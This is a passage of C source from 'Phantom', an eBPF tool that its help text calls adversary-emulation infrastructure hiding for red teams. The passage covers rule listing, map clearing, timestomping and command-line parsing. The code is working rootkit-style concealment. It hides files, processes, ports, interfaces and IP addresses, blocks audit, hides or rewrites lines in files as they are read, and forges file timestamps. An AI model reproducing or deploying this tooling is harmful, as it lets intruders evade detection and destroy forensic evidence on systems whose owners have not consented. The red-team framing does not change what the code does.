                LOG_INFO("  %u.%u.%u.%u/%u",
                         key.data[0], key.data[1], key.data[2], key.data[3],
                         key.prefixlen);
                n++;
            }
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");

    /* file_filter_rules HASH */
    LOG_INFO("File content filters:");
    n = 0;
    {
        int fd = bpf_map__fd(skel->maps.file_filter_rules);
        char key[MAX_FILE_FILTER_PATH], next_key[MAX_FILE_FILTER_PATH];
        char *key_ptr = NULL;
        struct file_filter_rule rule;

        while (bpf_map_get_next_key(fd, key_ptr, next_key) == 0) {
            memcpy(key, next_key, sizeof(key));
            key_ptr = key;
            if (bpf_map_lookup_elem(fd, key, &rule) == 0) {
                if (rule.mode == FILE_FILTER_MODE_REPLACE)
                    LOG_INFO("  file-replace %s search=%s replace=%s",
                             key, rule.search, rule.replace);
                else
                    LOG_INFO("  file-line-hide %s search=%s", key, rule.search);
                n++;
            }
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");

    /* file_filter_exempt_comms HASH */
    LOG_INFO("File-filter exempts (comm):");
    n = 0;
    {
        int fd = bpf_map__fd(skel->maps.file_filter_exempt_comms);
        char key[TASK_COMM_LEN], next_key[TASK_COMM_LEN];
        char *key_ptr = NULL;
        __u8 val;

        while (bpf_map_get_next_key(fd, key_ptr, next_key) == 0) {
            memcpy(key, next_key, sizeof(key));
            key_ptr = key;
            if (bpf_map_lookup_elem(fd, key, &val) == 0) {
                LOG_INFO("  %s", key);
                n++;
            }
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");

    /* file_filter_exempt_pids HASH */
    LOG_INFO("File-filter exempts (pid):");
    n = 0;
    {
        int fd = bpf_map__fd(skel->maps.file_filter_exempt_pids);
        __u32 key = 0, next_key = 0;
        __u32 *key_ptr = NULL;
        __u8 val;

        while (bpf_map_get_next_key(fd, key_ptr, &next_key) == 0) {
            key = next_key;
            key_ptr = &key;
            if (bpf_map_lookup_elem(fd, &key, &val) == 0) {
                LOG_INFO("  %u", key);
                n++;
            }
        }
    }
    if (n == 0)
        LOG_INFO("  (none)");
}


// ============================================================
// Usage
// ============================================================
/*
 * usage - Print CLI help to stderr.
 */
static void usage(const char *prog)
{
    fprintf(stderr,
        "Phantom - eBPF Adversary Emulation Infrastructure Hider\n"
        "For authorized red team operations and training only.\n\n"
        "Usage: %s [OPTIONS] <COMMAND>\n\n"
        "Commands:\n"
        "  daemon                    Run in daemon mode (hide + monitor events)\n"
        "  status                    Show current configuration\n"
        "  add <target>              Add a rule or enable a feature\n"
        "  del <target>              Remove a rule\n"
        "  list [category]           List rules\n"
        "  flush                     Clear all rules\n\n"
        "Feature Toggles:\n"
        "  %s add enable-files             Enable file hiding\n"
        "  %s add enable-procs             Enable process hiding\n"
        "  %s add enable-ports             Enable port hiding\n"
        "  %s add enable-audit             Enable audit blocking\n"
        "  %s add enable-exec              Enable exec capture\n"
        "  %s add enable-file-filter       Enable file content filtering\n"
        "  %s add enable-iface             Enable interface hiding\n"
        "  %s add enable-ip                Enable IP address hiding\n"
        "  %s add enable-timestomp         Enable timestomp feature\n"
        "  %s add disable-ports            Disable port hiding\n"
        "  %s add disable-all              Disable all features\n\n"
        "Hiding Rules:\n"
        "  %s add file hide <path>         Hide a file\n"
        "  %s add file hide-prefix <pre>   Hide files matching prefix\n"
        "  %s add process hide <pid|name|/path>  Hide a process\n"
        "  %s add process hide-prefix <path>     Hide by exe path prefix (LPM)\n"
        "  %s add port hide <port>         Hide a network port\n"
        "  %s add exec hide <name>         Capture exec events\n\n"
        "Interface Hiding:\n"
        "  %s add iface hide <name>        Hide a network interface from ip a\n\n"
        "IP Address Hiding:\n"
        "  %s add ip hide <addr>           Hide an IP address from ip a and sniffers\n"
        "  %s add ip hide-prefix <prefix>  Hide an IP prefix (e.g., 172.17.)\n\n"
        "File Content Filtering:\n"
        "  %s add file-line-hide <file>:<search>\n"
        "  %s add file-replace <file>:<search>:<replace>\n"
        "  %s add file-filter-exempt <name|/path/to/binary>\n\n"
        "Timestomp:\n"
        "  %s add timestomp [/path/to/file] <YYYYMMDDhhmmss>\n"
        "  %s del timestomp <file|all>\n\n"
        "Remove Rules:\n"
        "  %s del file hide <path>         Remove a file hide rule\n"
        "  %s del file hide-prefix <pre>   Remove a file prefix rule\n"
        "  %s del process hide <pid|name|/path>\n"
        "  %s del process hide-prefix <path>\n"
        "  %s del port hide <port>\n"
        "  %s del file-line-hide <file>:<search>\n"
        "  %s del file-replace <file>:<search>:<replace>\n"
        "  %s del file-filter-exempt <name|/path/to/binary>\n\n"
        "Options:\n"
        "  -v, --verbose       Verbose logging\n"
        "  --debug             Print hide events (daemon mode)\n"
        "  -h, --help          Show this help\n\n",
        prog, prog, prog, prog, prog, prog, prog, prog, prog,
        prog, prog, prog, prog, prog, prog, prog, prog, prog,
        prog, prog, prog, prog, prog, prog, prog, prog, prog,
        prog, prog, prog, prog, prog, prog, prog);
}

// ============================================================
// Argument parsing
// ============================================================
/*
 * is_command - True if s is daemon, status, add, del, list, or flush.
 */
static bool is_command(const char *s)
{
    return s && (!strcmp(s, "daemon") || !strcmp(s, "status") ||
                 !strcmp(s, "add") || !strcmp(s, "del") || !strcmp(s, "list") || !strcmp(s, "flush"));
}

/*
 * parse_file_filter_arg - Parse <file>:<search>[:<replace>] into cfg.
 *
 * Returns: 0 on success, -1 on parse error
 */
static int parse_file_filter_arg(const char *arg, struct phantom_cli_config *cfg,
                                 int mode)
{
    if (cfg->file_filter_count >= MAX_FILE_FILTERS) {
        fprintf(stderr, "Too many file filters (max %d)\n", MAX_FILE_FILTERS);
        return -1;
    }

    const char *colon1 = strchr(arg, ':');
    if (!colon1) {
        fprintf(stderr, "Invalid file filter format: %s\n", arg);
        fprintf(stderr, "Expected: <file>:<search> or <file>:<search>:<replace>\n");
        return -1;
    }

    size_t path_len = colon1 - arg;
    if (path_len == 0 || path_len >= MAX_FILE_FILTER_PATH) {
        fprintf(stderr, "File path too long or empty\n");
        return -1;
    }

    char *path = strndup(arg, path_len);
    if (!path)
        return -1;

    const char *colon2 = strchr(colon1 + 1, ':');

    char *search = NULL;
    char *replace = strdup("");  /* empty replace when omitted */

    if (mode == FILE_FILTER_MODE_REPLACE && colon2) {
        size_t search_len = colon2 - colon1 - 1;
        if (search_len == 0 || search_len >= MAX_FILE_FILTER_SEARCH) {
            fprintf(stderr, "Search string too long or empty\n");
            free(path);
            free(replace);
            return -1;
        }
        search = strndup(colon1 + 1, search_len);

        const char *replace_str = colon2 + 1;
        size_t replace_len = strlen(replace_str);
        if (replace_len >= MAX_FILE_FILTER_REPLACE) {
            fprintf(stderr, "Replacement string too long (max %d)\n",
                    MAX_FILE_FILTER_REPLACE - 1);
            free(path);
            free(search);
            free(replace);
            return -1;
        }
        free(replace);
        replace = strdup(replace_str);
    } else {
        search = strdup(colon1 + 1);
    }

    if (!path || !search || !replace) {
        free(path);
        free(search);
        free(replace);
        return -1;
    }

    /* one rule per path (map keyed by path) */
    for (int i = 0; i < cfg->file_filter_count; i++) {
        if (cfg->file_filters[i].path &&
            !strcmp(cfg->file_filters[i].path, path)) {
            fprintf(stderr,
                    "File filter already exists for %s "
                    "(only one filter per file is allowed)\n",
                    path);
            free(path);
            free(search);
            free(replace);
            return -1;
        }
    }

    struct file_filter_entry *entry =
        &cfg->file_filters[cfg->file_filter_count];
    entry->path = path;
    entry->search = search;
    entry->replace = replace;
    entry->mode = mode;
    cfg->file_filter_count++;

    return 0;
}

/*
 * parse_timestamp - Parse YYYYMMDDhhmmss into time_t via mktime.
 *
 * Returns: 0 on success, -1 on invalid input
 */
static int parse_timestamp(const char *timestamp, time_t *sec_out)
{
    if (strlen(timestamp) != 14) {
        fprintf(stderr, "Invalid timestamp format: %s (expected YYYYMMDDhhmmss)\n", timestamp);
        return -1;
    }

    struct tm tm = {0};
    char buf[5];

    strncpy(buf, timestamp, 4);
    buf[4] = '\0';
    tm.tm_year = atoi(buf) - 1900;

    strncpy(buf, timestamp + 4, 2);
    buf[2] = '\0';
    tm.tm_mon = atoi(buf) - 1;

    strncpy(buf, timestamp + 6, 2);
    buf[2] = '\0';
    tm.tm_mday = atoi(buf);

    strncpy(buf, timestamp + 8, 2);
    buf[2] = '\0';
    tm.tm_hour = atoi(buf);

    strncpy(buf, timestamp + 10, 2);
    buf[2] = '\0';
    tm.tm_min = atoi(buf);

    strncpy(buf, timestamp + 12, 2);
    buf[2] = '\0';
    tm.tm_sec = atoi(buf);

    if (tm.tm_mon < 0 || tm.tm_mon > 11 ||
        tm.tm_mday < 1 || tm.tm_mday > 31 ||
        tm.tm_hour < 0 || tm.tm_hour > 23 ||
        tm.tm_min < 0 || tm.tm_min > 59 ||
        tm.tm_sec < 0 || tm.tm_sec > 59) {
        fprintf(stderr, "Invalid timestamp values: %s\n", timestamp);
        return -1;
    }

    tm.tm_isdst = -1;  /* let mktime pick DST */
    *sec_out = mktime(&tm);
    if (*sec_out == -1) {
        fprintf(stderr, "Failed to convert timestamp: %s\n", timestamp);
        return -1;
    }

    return 0;
}

/*
 * apply_timestomps - utimensat per-file and global rules when timestomp enabled.
 */
static int apply_timestomps(struct phantom_cli_config *cfg)
{
    if (!cfg->enable_timestomp)
        return 0;

    time_t target_time;
    int applied = 0;
    int errors = 0;

    /* timestomp_rules */
    for (int i = 0; i < cfg->timestomp_rule_count; i++) {
        struct timestomp_rule *rule = &cfg->timestomp_rules[i];

        if (parse_timestamp(rule->timestamp, &target_time) != 0) {
            errors++;
            continue;
        }

        struct timespec ts[2];
        ts[0].tv_sec = target_time;  /* atime */
        ts[0].tv_nsec = 0;
        ts[1].tv_sec = target_time;  /* mtime */
        ts[1].tv_nsec = 0;

        if (utimensat(AT_FDCWD, rule->path, ts, 0) == 0) {
            LOG_INFO("Timestomped %s to %s", rule->path, rule->timestamp);
            applied++;
        } else {
            LOG_ERROR("Failed to timestomp %s: %s", rule->path, strerror(errno));
            errors++;
        }
    }

    /* global_timestomp_timestamp on all hidden files */
    if (cfg->global_timestomp_timestamp) {
        if (parse_timestamp(cfg->global_timestomp_timestamp, &target_time) == 0) {
            struct timespec ts[2];
            ts[0].tv_sec = target_time;
            ts[0].tv_nsec = 0;
            ts[1].tv_sec = target_time;
            ts[1].tv_nsec = 0;

            /* cfg.files paths */
            for (int i = 0; i < cfg->file_count; i++) {
                if (utimensat(AT_FDCWD, cfg->files[i], ts, 0) == 0) {
                    LOG_INFO("Timestomped %s to %s (global)",
                             cfg->files[i], cfg->global_timestomp_timestamp);
                    applied++;
                } else {
                    LOG_ERROR("Failed to timestomp %s: %s",
                              cfg->files[i], strerror(errno));
                    errors++;
                }
            }
        }
    }

    LOG_INFO("Timestomp complete: %d applied, %d errors", applied, errors);
    return errors > 0 ? -1 : 0;
}

/*
 * clear_all_rule_maps - Delete or zero all rule entries before SIGHUP reload.
 */
static void clear_all_rule_maps(void)
{
    /* Clear hidden_files (HASH map, key=64B) */
    {
        char key[64] = {};
        char next_key[64] = {};
        while (bpf_map__get_next_key(skel->maps.hidden_files, key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.hidden_files, next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }

    /* Clear hidden_prefixes (LPM_TRIE map, key=36B: u32 prefixlen + char[32]) */
    {
        char key[36] = {};
        char next_key[36] = {};
        while (bpf_map__get_next_key(skel->maps.hidden_prefixes, key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.hidden_prefixes, next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }

    /* Clear hidden_proc_names (HASH map, key=16B) */
    {
        char key[16] = {};
        char next_key[16] = {};
        while (bpf_map__get_next_key(skel->maps.hidden_proc_names, key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.hidden_proc_names, next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }

    /* Clear hidden_proc_path_prefixes (LPM_TRIE) */
    {
        char key[4 + MAX_PROC_PATH_PREFIX_LEN] = {};
        char next_key[4 + MAX_PROC_PATH_PREFIX_LEN] = {};
        while (bpf_map__get_next_key(skel->maps.hidden_proc_path_prefixes,
                                     key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.hidden_proc_path_prefixes,
                                 next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }

    /* Clear hidden_exec_names (HASH map, key=16B) */
    {
        char key[16] = {};
        char next_key[16] = {};
        while (bpf_map__get_next_key(skel->maps.hidden_exec_names, key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.hidden_exec_names, next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }

    /* Clear hidden_pid_bits (ARRAY bitmap) - zero all bytes */
    {
        __u8 zero = 0;
        for (__u32 i = 0; i < HIDDEN_PID_BITMAP_BYTES; i++) {
            bpf_map__update_elem(skel->maps.hidden_pid_bits, &i, sizeof(i),
                                 &zero, sizeof(zero), BPF_ANY);
        }
    }

    /* Clear hidden_port_bits (ARRAY bitmap) - zero all bytes */
    {
        __u8 zero = 0;
        for (__u32 i = 0; i < HIDDEN_PORT_BITMAP_BYTES; i++) {
            bpf_map__update_elem(skel->maps.hidden_port_bits, &i, sizeof(i),
                                 &zero, sizeof(zero), BPF_ANY);
        }
    }

    /* Clear target_ppid (ARRAY, single entry) */
    {
        __u32 zero_key = 0;
        __u32 zero_val = 0;
        bpf_map__update_elem(skel->maps.target_ppid, &zero_key, sizeof(zero_key),
                             &zero_val, sizeof(zero_val), BPF_ANY);
    }

    /* Clear file_filter_rules (HASH map, key=128B) */
    {
        char key[128] = {};
        char next_key[128] = {};
        while (bpf_map__get_next_key(skel->maps.file_filter_rules, key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.file_filter_rules, next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }

    /* Clear file_filter_exempt_comms (HASH map, key=16B) */
    {
        char key[TASK_COMM_LEN] = {};
        char next_key[TASK_COMM_LEN] = {};
        while (bpf_map__get_next_key(skel->maps.file_filter_exempt_comms, key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.file_filter_exempt_comms, next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }

    /* Clear file_filter_exempt_pids (HASH map, key=4B) */
    {
        __u32 key = 0;
        __u32 next_key = 0;
        while (bpf_map__get_next_key(skel->maps.file_filter_exempt_pids, &key, &next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.file_filter_exempt_pids, &next_key, sizeof(next_key), BPF_ANY);
            key = next_key;
        }
    }

    /* Clear hidden_iface_names (HASH map, key=16B) */
    {
        char key[16] = {};
        char next_key[16] = {};
        while (bpf_map__get_next_key(skel->maps.hidden_iface_names, key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.hidden_iface_names, next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }

    /* Clear hidden_ifindexes (HASH map, key=u32) */
    {
        __u32 key = 0, next_key = 0;
        while (bpf_map__get_next_key(skel->maps.hidden_ifindexes, &key, &next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.hidden_ifindexes, &next_key, sizeof(next_key), BPF_ANY);
            key = next_key;
        }
    }

    /* Clear hidden_ip_addrs (LPM_TRIE map, key=8B: u32 prefixlen + u8 data[4]) */
    {
        char key[8] = {};
        char next_key[8] = {};
        while (bpf_map__get_next_key(skel->maps.hidden_ip_addrs, key, next_key, sizeof(key)) == 0) {
            bpf_map__delete_elem(skel->maps.hidden_ip_addrs, next_key, sizeof(next_key), BPF_ANY);
            memcpy(key, next_key, sizeof(key));
        }
    }
}

/*
 * settle_reload_requests - Debounce coalesced SIGHUP before reading JSON.
 *
 * Rapid add/del can reload between partial saves; wait 150ms quiet window.
 */
static void settle_reload_requests(void)
{
    struct timespec pause = { .tv_sec = 0, .tv_nsec = 150000000L }; /* 150 ms */

    for (;;) {
        reload_config = 0;
        nanosleep(&pause, NULL);
        if (!reload_config)
            return;
    }
}

/*
 * reload_daemon_config - Reload /opt/pinfra.json and repopulate BPF maps.
 *
 * Programs stay attached; feature_config gates hooks at runtime.
 */
static int reload_daemon_config(void)
{
    struct phantom_cli_config new_cfg;
    phantom_config_init(&new_cfg);

    LOG_INFO("Reloading configuration...");

    /* phantom_config_load_builtin */
    if (phantom_config_load_builtin(&new_cfg) != 0) {
        LOG_ERROR("Failed to reload config from file (keeping current maps)");
        phantom_config_free(&new_cfg);
        return -1;
    }

    phantom_config_resolve_processes(&new_cfg);

    clear_all_rule_maps();

    /* feature_config toggles */
    set_config(CFG_ENABLE_FILE_HIDING, new_cfg.enable_files ? 1 : 0);
    set_config(CFG_ENABLE_PROCESS_HIDING, new_cfg.enable_procs ? 1 : 0);
    set_config(CFG_ENABLE_PORT_HIDING, new_cfg.enable_ports ? 1 : 0);
    set_config(CFG_ENABLE_AUDIT_BLOCKING, new_cfg.enable_audit ? 1 : 0);
    set_config(CFG_ENABLE_TIMESTOMP, new_cfg.enable_timestomp ? 1 : 0);
    set_config(CFG_ENABLE_EXEC_HIDING, new_cfg.enable_exec ? 1 : 0);
    set_config(CFG_ENABLE_FILE_FILTER, new_cfg.enable_file_filter ? 1 : 0);
    set_config(CFG_ENABLE_IFACE_HIDING, new_cfg.enable_iface ? 1 : 0);
    set_config(CFG_ENABLE_IP_HIDING, new_cfg.enable_ip ? 1 : 0);

    apply_hide_config(new_cfg.files, new_cfg.file_count,
                      new_cfg.prefixes, new_cfg.prefix_count,
                      (__u32 *)new_cfg.pids, new_cfg.pid_count,
                      (__u32 *)new_cfg.ports, new_cfg.port_count,
                      new_cfg.set_ppid ? new_cfg.target_ppid : 0);

    apply_proc_path_lpm(&new_cfg);

    apply_iface_ip_config(&new_cfg);

    if (new_cfg.file_filter_count > 0)
        apply_file_filter_config(&new_cfg);
    if (new_cfg.file_filter_exempt_count > 0)
        apply_file_filter_exempts(&new_cfg);

    for (int i = 0; i < new_cfg.exec_name_count; i++) {
        char key[16] = {};
        strncpy(key, new_cfg.exec_names[i], sizeof(key) - 1);
        __u8 val = 1;
        bpf_map__update_elem(skel->maps.hidden_exec_names, key, sizeof(key),
                             &val, sizeof(val), BPF_ANY);
    }

    if (new_cfg.enable_timestomp) {
        apply_timestomps(&new_cfg);
    }

    LOG_INFO("Config reloaded successfully: %d file(s), %d prefix(es), "
             "%d pid(s) (%d name(s)), %d port(s), %d iface(s), %d ip(s)",
             new_cfg.file_count, new_cfg.prefix_count, new_cfg.pid_count,
             new_cfg.process_name_count, new_cfg.port_count,
             new_cfg.iface_count, new_cfg.ip_count);
    LOG_INFO("Features: files=%s procs=%s ports=%s audit=%s timestomp=%s "
             "exec=%s file_filter=%s iface=%s ip=%s",
             new_cfg.enable_files ? "ON" : "off",
             new_cfg.enable_procs ? "ON" : "off",
             new_cfg.enable_ports ? "ON" : "off",
             new_cfg.enable_audit ? "ON" : "off",
             new_cfg.enable_timestomp ? "ON" : "off",
             new_cfg.enable_exec ? "ON" : "off",
             new_cfg.enable_file_filter ? "ON" : "off",
             new_cfg.enable_iface ? "ON" : "off",
             new_cfg.enable_ip ? "ON" : "off");

    phantom_config_free(&new_cfg);
    return 0;
}

/*
 * notify_daemon_reload - SIGHUP daemon from pidfile if running.
 *
 * No error when daemon is down; rules persist in JSON for next start.
 */
static void notify_daemon_reload(void)
{
    pid_t daemon_pid = read_pidfile();
    if (daemon_pid <= 0)
        return;

    if (kill(daemon_pid, SIGHUP) != 0) {
        if (errno != ESRCH) {
            LOG_WARN("Failed to notify daemon (PID %d): %s", daemon_pid, strerror(errno));
        }
    } else {
        LOG_INFO("Notified daemon (PID %d) to reload config", daemon_pid);
    }
}

/*
 * parse_add_args - Parse phantom add (rules, toggles, timestomp).
 *
 * Returns: 0 on success, -1 on usage error
 */
static int parse_add_args(int argc, char **argv, int arg_start,
                          struct phantom_cli_config *cfg)
{
    if (arg_start >= argc) {
        fprintf(stderr, "Usage: phantom add <rule|enable|disable>\n");
        return -1;
    }

    const char *what = argv[arg_start];

    /* enable-* / disable-* */
    if (!strcmp(what, "enable-files")) {
        cfg->enable_files = true;
        cfg->set_enable_files = true;
        return 0;
    }
    if (!strcmp(what, "enable-procs")) {
        cfg->enable_procs = true;
        cfg->set_enable_procs = true;
        return 0;
    }
    if (!strcmp(what, "enable-ports")) {
        cfg->enable_ports = true;
        cfg->set_enable_ports = true;
        return 0;
    }
    if (!strcmp(what, "enable-audit")) {
        cfg->enable_audit = true;
        cfg->set_enable_audit = true;
        return 0;
    }
    if (!strcmp(what, "enable-exec")) {
        cfg->enable_exec = true;
        cfg->set_enable_exec = true;
        return 0;
    }
    if (!strcmp(what, "enable-file-filter")) {
        cfg->enable_file_filter = true;
        cfg->set_enable_file_filter = true;
        return 0;
    }
    if (!strcmp(what, "enable-iface")) {
        cfg->enable_iface = true;
        cfg->set_enable_iface = true;
        return 0;
    }
    if (!strcmp(what, "enable-ip")) {
        cfg->enable_ip = true;
        cfg->set_enable_ip = true;
        return 0;
    }
    if (!strcmp(what, "disable-ports")) {
        cfg->enable_ports = false;
        cfg->set_enable_ports = true;
        return 0;
    }
    if (!strcmp(what, "disable-all")) {
        cfg->enable_files = false;
        cfg->enable_procs = false;
        cfg->enable_ports = false;
        cfg->enable_audit = false;
        cfg->enable_exec = false;
        cfg->enable_file_filter = false;
        cfg->enable_timestomp = false;
        cfg->enable_iface = false;
        cfg->enable_ip = false;
        cfg->set_enable_files = true;
        cfg->set_enable_procs = true;
        cfg->set_enable_ports = true;
        cfg->set_enable_audit = true;
        cfg->set_enable_exec = true;
        cfg->set_enable_file_filter = true;
        cfg->set_enable_timestomp = true;
        cfg->set_enable_iface = true;
        cfg->set_enable_ip = true;
        return 0;
    }

    /* file / process / port / exec / iface / ip rules */
    if (!strcmp(what, "file")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom add file <hide|hide-prefix> <target>\n");
            return -1;
        }
        const char *action = argv[arg_start + 1];
        const char *target = argv[arg_start + 2];

        if (!strcmp(action, "hide")) {
            cfg->files[cfg->file_count++] = strdup(target);
            cfg->enable_files = true;
            cfg->set_enable_files = true;
        } else if (!strcmp(action, "hide-prefix")) {
            cfg->prefixes[cfg->prefix_count++] = strdup(target);
            cfg->enable_files = true;
            cfg->set_enable_files = true;
        } else {
            fprintf(stderr, "Unknown file action: %s\n", action);
            return -1;
        }
        return 0;
    }

    if (!strcmp(what, "process")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom add process <hide|hide-prefix> <pid|name|/path>\n");
            return -1;
        }
        const char *action = argv[arg_start + 1];
        const char *target = argv[arg_start + 2];

        if (!strcmp(action, "hide")) {
            char *endp = NULL;
            unsigned long pid = strtoul(target, &endp, 10);
            if (endp != target && *endp == '\0') {
                cfg->pids[cfg->pid_count++] = (__u32)pid;
            } else {
                cfg->process_names[cfg->process_name_count++] = strdup(target);
            }
            cfg->enable_procs = true;
            cfg->set_enable_procs = true;
        } else if (!strcmp(action, "hide-prefix")) {
            if (cfg->process_path_prefix_count >= MAX_HIDDEN_PROC_PATH_PREFIXES) {
                fprintf(stderr, "Too many process path prefixes (max %d)\n",
                        MAX_HIDDEN_PROC_PATH_PREFIXES);
                return -1;
            }
            cfg->process_path_prefixes[cfg->process_path_prefix_count++] =
                strdup(target);
            cfg->enable_procs = true;
            cfg->set_enable_procs = true;
        } else {
            fprintf(stderr, "Unknown process action: %s\n", action);
            return -1;
        }
        return 0;
    }

    if (!strcmp(what, "port")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom add port hide <port>\n");
            return -1;
        }
        const char *action = argv[arg_start + 1];
        const char *target = argv[arg_start + 2];

        if (!strcmp(action, "hide")) {
            cfg->ports[cfg->port_count++] = (__u32)strtoul(target, NULL, 10);
            cfg->enable_ports = true;
            cfg->set_enable_ports = true;
        } else {
            fprintf(stderr, "Unknown port action: %s\n", action);
            return -1;
        }
        return 0;
    }

    if (!strcmp(what, "exec")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom add exec hide <name>\n");
            return -1;
        }
        const char *action = argv[arg_start + 1];
        const char *target = argv[arg_start + 2];

        if (!strcmp(action, "hide")) {
            cfg->exec_names[cfg->exec_name_count++] = strdup(target);
            cfg->enable_exec = true;
            cfg->set_enable_exec = true;
        } else {
            fprintf(stderr, "Unknown exec action: %s\n", action);
            return -1;
        }
        return 0;
    }

    if (!strcmp(what, "iface")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom add iface hide <name>\n");
            return -1;
        }
        const char *action = argv[arg_start + 1];
        const char *target = argv[arg_start + 2];

        if (!strcmp(action, "hide")) {
            cfg->iface_names[cfg->iface_count++] = strdup(target);
            cfg->enable_iface = true;
            cfg->set_enable_iface = true;
        } else {
            fprintf(stderr, "Unknown iface action: %s\n", action);
            return -1;
        }
        return 0;
    }

    if (!strcmp(what, "ip")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom add ip <hide|hide-prefix> <addr>\n");
            return -1;
        }
        const char *action = argv[arg_start + 1];
        const char *target = argv[arg_start + 2];

        if (!strcmp(action, "hide")) {
            cfg->ip_addrs[cfg->ip_count++] = strdup(target);
            cfg->enable_ip = true;
            cfg->set_enable_ip = true;
        } else if (!strcmp(action, "hide-prefix")) {
            cfg->ip_addrs[cfg->ip_count++] = strdup(target);
            cfg->enable_ip = true;
            cfg->set_enable_ip = true;
        } else {
            fprintf(stderr, "Unknown ip action: %s\n", action);
            return -1;
        }
        return 0;
    }

    /* file-line-hide / file-replace / file-filter-exempt */
    if (!strcmp(what, "file-line-hide")) {
        if (arg_start + 1 >= argc) {
            fprintf(stderr, "Usage: phantom add file-line-hide <file>:<search>\n");
            return -1;
        }
        return parse_file_filter_arg(argv[arg_start + 1], cfg,
                                     FILE_FILTER_MODE_HIDE);
    }

    if (!strcmp(what, "file-replace")) {
        if (arg_start + 1 >= argc) {
            fprintf(stderr, "Usage: phantom add file-replace <file>:<search>:<replace>\n");
            return -1;
        }
        return parse_file_filter_arg(argv[arg_start + 1], cfg,
                                     FILE_FILTER_MODE_REPLACE);
    }

    if (!strcmp(what, "file-filter-exempt")) {
        if (arg_start + 1 >= argc) {
            fprintf(stderr, "Usage: phantom add file-filter-exempt <name|/path/to/binary>\n");
            return -1;
        }
        const char *target = argv[arg_start + 1];
        if (!target[0]) {
            fprintf(stderr, "Empty file-filter-exempt target\n");
            return -1;
        }
        for (int i = 0; i < cfg->file_filter_exempt_count; i++) {
            if (!strcmp(cfg->file_filter_exempts[i], target)) {
                LOG_INFO("File-filter exempt already present: %s", target);
                return 0;
            }
        }
        if (cfg->file_filter_exempt_count >= MAX_FILE_FILTER_EXEMPTS) {
            fprintf(stderr, "Too many file-filter exempts (max %d)\n",
                    MAX_FILE_FILTER_EXEMPTS);
            return -1;
        }
        if (target[0] != '/' && strlen(target) >= TASK_COMM_LEN) {
            fprintf(stderr, "Exempt name too long (max %d chars): %s\n",
                    TASK_COMM_LEN - 1, target);
            return -1;
        }
        cfg->file_filter_exempts[cfg->file_filter_exempt_count++] = strdup(target);
        cfg->enable_file_filter = true;
        cfg->set_enable_file_filter = true;
        return 0;
    }

    /* enable-timestomp / timestomp */
    if (!strcmp(what, "enable-timestomp")) {
        cfg->enable_timestomp = true;
        cfg->set_enable_timestomp = true;
        return 0;
    }

    if (!strcmp(what, "timestomp")) {
        if (arg_start + 1 >= argc) {
            fprintf(stderr, "Usage: phantom add timestomp [/path/to/file] <YYYYMMDDhhmmss>\n");
            return -1;
        }

        const char *arg1 = argv[arg_start + 1];

        /* 14-digit arg => global timestomp */
        if (strlen(arg1) == 14 && strspn(arg1, "0123456789") == 14) {
            cfg->global_timestomp_timestamp = strdup(arg1);
            cfg->enable_timestomp = true;
            cfg->set_enable_timestomp = true;
        } else if (arg_start + 2 < argc) {
            /* path + timestamp */
            const char *file_path = arg1;
            const char *timestamp = argv[arg_start + 2];

            if (strlen(timestamp) != 14 || strspn(timestamp, "0123456789") != 14) {
                fprintf(stderr, "Invalid timestamp format: %s (expected YYYYMMDDhhmmss)\n", timestamp);
                return -1;
            }

            if (cfg->timestomp_rule_count >= MAX_TIMESTOMP_RULES) {
                fprintf(stderr, "Too many timestomp rules (max %d)\n", MAX_TIMESTOMP_RULES);
                return -1;
            }

            struct timestomp_rule *rule = &cfg->timestomp_rules[cfg->timestomp_rule_count++];
            rule->path = strdup(file_path);
            rule->timestamp = strdup(timestamp);
            cfg->enable_timestomp = true;
            cfg->set_enable_timestomp = true;
        } else {
            fprintf(stderr, "Usage: phantom add timestomp [/path/to/file] <YYYYMMDDhhmmss>\n");
            return -1;
        }
        return 0;
    }

    fprintf(stderr, "Unknown add target: %s\n", what);
    return -1;
}

/*
 * parse_del_args - Parse phantom del and remove matching cfg entries.
 *
 * Returns: 0 on success, -1 on usage error
 */
static int parse_del_args(int argc, char **argv, int arg_start,
                          struct phantom_cli_config *cfg)
{
    if (arg_start >= argc) {
        fprintf(stderr, "Usage: phantom del <rule>\n");
        return -1;
    }

    const char *what = argv[arg_start];

    if (!strcmp(what, "file")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom del file <hide|hide-prefix> <target>\n");
            return -1;
        }
        const char *action = argv[arg_start + 1];
        const char *target = argv[arg_start + 2];

        if (!strcmp(action, "hide")) {
            for (int i = 0; i < cfg->file_count; i++) {
                if (!strcmp(cfg->files[i], target)) {
